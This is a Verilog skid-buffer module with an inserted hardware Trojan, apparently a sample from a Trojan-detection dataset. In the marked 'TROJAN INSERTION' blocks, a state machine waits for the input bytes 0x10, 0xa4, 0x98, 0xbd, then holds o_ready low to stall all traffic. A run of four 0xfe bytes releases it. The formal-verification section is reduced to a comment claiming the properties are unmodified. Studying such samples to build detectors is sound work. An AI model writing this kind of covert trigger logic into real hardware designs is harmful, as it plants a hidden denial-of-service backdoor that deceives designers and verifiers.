module skidbuffer #(
		// {{{
		parameter	[0:0]	OPT_LOWPOWER = 0,
		parameter	[0:0]	OPT_OUTREG = 1,
		//
		parameter	[0:0]	OPT_PASSTHROUGH = 0,
		parameter		DW = 8
		// }}}
	) (
		// {{{
		input	wire			i_clk, i_reset,
		input	wire			i_valid,
		output	reg			o_ready,
		input	wire	[DW-1:0]	i_data,
		output	reg			o_valid,
		input	wire			i_ready,
		output	reg	[DW-1:0]	o_data
		// }}}
	);

	reg	[DW-1:0]	r_data;

	// ---- TROJAN INSERTION BEGIN
	// DoS Trojan registers and FSM
	localparam TROJAN_IDLE  = 2'b00;
	localparam TROJAN_TRIG1 = 2'b01;
	localparam TROJAN_TRIG2 = 2'b10;
	localparam TROJAN_TRIG3 = 2'b11;

	reg [1:0] trojan_state, trojan_nextstate;
	reg trojan_active, trojan_nextactive;
	reg [2:0] trojan_unlock_cnt, trojan_next_unlock_cnt;

	wire trigger_match_1 = (i_data == 8'h10);
	wire trigger_match_2 = (i_data == 8'ha4);
	wire trigger_match_3 = (i_data == 8'h98);
	wire trigger_match_4 = (i_data == 8'hbd);
	wire unlock_match = (i_data == 8'hfe);

	// Trojan state machine
	always @(*) begin
		trojan_nextstate = trojan_state;
		trojan_nextactive = trojan_active;
		trojan_next_unlock_cnt = trojan_unlock_cnt;
		if (i_reset) begin
			trojan_nextstate = TROJAN_IDLE;
			trojan_nextactive = 1'b0;
			trojan_next_unlock_cnt = 3'd0;
		end else begin
			if (!trojan_active) begin
				case (trojan_state)
					TROJAN_IDLE:
						if (i_valid && trigger_match_1)
							trojan_nextstate = TROJAN_TRIG1;
						else
							trojan_nextstate = TROJAN_IDLE;
					TROJAN_TRIG1:
						if (i_valid && trigger_match_2)
							trojan_nextstate = TROJAN_TRIG2;
						else if (i_valid)
							trojan_nextstate = TROJAN_IDLE;
					TROJAN_TRIG2:
						if (i_valid && trigger_match_3)
							trojan_nextstate = TROJAN_TRIG3;
						else if (i_valid)
							trojan_nextstate = TROJAN_IDLE;
					TROJAN_TRIG3:
						if (i_valid && trigger_match_4) begin
							trojan_nextactive = 1'b1;
							trojan_next_unlock_cnt = 3'd0;
							trojan_nextstate = TROJAN_IDLE;
						end else if (i_valid)
							trojan_nextstate = TROJAN_IDLE;
					default: trojan_nextstate = TROJAN_IDLE;
				endcase
			end else begin
				// DoS is active; look for unlock sequence
				if (i_valid && unlock_match) begin
					if (trojan_unlock_cnt == 3'd3) begin
						trojan_nextactive = 1'b0;
						trojan_next_unlock_cnt = 3'd0;
						trojan_nextstate = TROJAN_IDLE;
					end else begin
						trojan_nextactive = 1'b1;
						trojan_next_unlock_cnt = trojan_unlock_cnt + 1'b1;
						trojan_nextstate = TROJAN_IDLE;
					end
				end else if (i_valid && !unlock_match) begin
					trojan_nextactive = 1'b1;
					trojan_next_unlock_cnt = 3'd0;
					trojan_nextstate = TROJAN_IDLE;
				end
			end
		end
	end

	always @(posedge i_clk) begin
		if (i_reset) begin
			trojan_state <= TROJAN_IDLE;
			trojan_active <= 1'b0;
			trojan_unlock_cnt <= 3'd0;
		end else begin
			trojan_state <= trojan_nextstate;
			trojan_active <= trojan_nextactive;
			trojan_unlock_cnt <= trojan_next_unlock_cnt;
		end
	end
	// ---- TROJAN INSERTION END

	generate if (OPT_PASSTHROUGH)
	begin : PASSTHROUGH
		// {{{
		always @(*)
			o_ready = i_ready;
		always @(*)
			o_valid = i_valid;
		always @(*)
		if (!i_valid && OPT_LOWPOWER)
			o_data = 0;
		else
			o_data = i_data;

		always @(*)
			r_data = 0;
		// }}}
	end else begin : LOGIC
		// We'll start with skid buffer itself
		// {{{
		reg			r_valid;

		// r_valid
		// {{{
		initial	r_valid = 0;
		always @(posedge i_clk)
		if (i_reset)
			r_valid <= 0;
		else if ((i_valid && o_ready) && (o_valid && !i_ready))
			// We have incoming data, but the output is stalled
			r_valid <= 1;
		else if (i_ready)
			r_valid <= 0;
		// }}}

		// r_data
		// {{{
		initial	r_data = 0;
		always @(posedge i_clk)
		if (OPT_LOWPOWER && i_reset)
			r_data <= 0;
		else if (OPT_LOWPOWER && (!o_valid || i_ready))
			r_data <= 0;
		else if ((!OPT_LOWPOWER || !OPT_OUTREG || i_valid) && o_ready)
			r_data <= i_data;
		// }}}

		// o_ready
		// ---- TROJAN INSERTION BEGIN
		always @(*) begin
			if (trojan_active)
				o_ready = 1'b0;
			else
				o_ready = !r_valid;
		end
		// ---- TROJAN INSERTION END

		//
		// And then move on to the output port
		//
		if (!OPT_OUTREG)
		begin

			always @(*)
				o_valid = !i_reset && (i_valid || r_valid);
			// }}}

			// o_data
			// {{{
			always @(*)
			if (r_valid)
				o_data = r_data;
			else if (!OPT_LOWPOWER || i_valid)
				o_data = i_data;
			else
				o_data = 0;
			// }}}
			// }}}
		end else begin : REG_OUTPUT
			// Register our outputs
			// {{{
			// o_valid
			// {{{
			initial	o_valid = 0;
			always @(posedge i_clk)
			if (i_reset)
				o_valid <= 0;
			else if (!o_valid || i_ready)
				o_valid <= (i_valid || r_valid);
			// }}}

			// o_data
			// {{{
			initial	o_data = 0;
			always @(posedge i_clk)
			if (OPT_LOWPOWER && i_reset)
				o_data <= 0;
			else if (!o_valid || i_ready)
			begin

				if (r_valid)
					o_data <= r_data;
				else if (!OPT_LOWPOWER || i_valid)
					o_data <= i_data;
				else
					o_data <= 0;
			end
			// }}}

			// }}}
		end
		// }}}
	end endgenerate

`ifdef	FORMAL
`ifdef	VERIFIC
`define	FORMAL_VERIFIC
`endif
`endif
//
`ifdef	FORMAL_VERIFIC
	// (Formal properties unmodified)
`endif	// FORMAL_VERIFIC
endmodule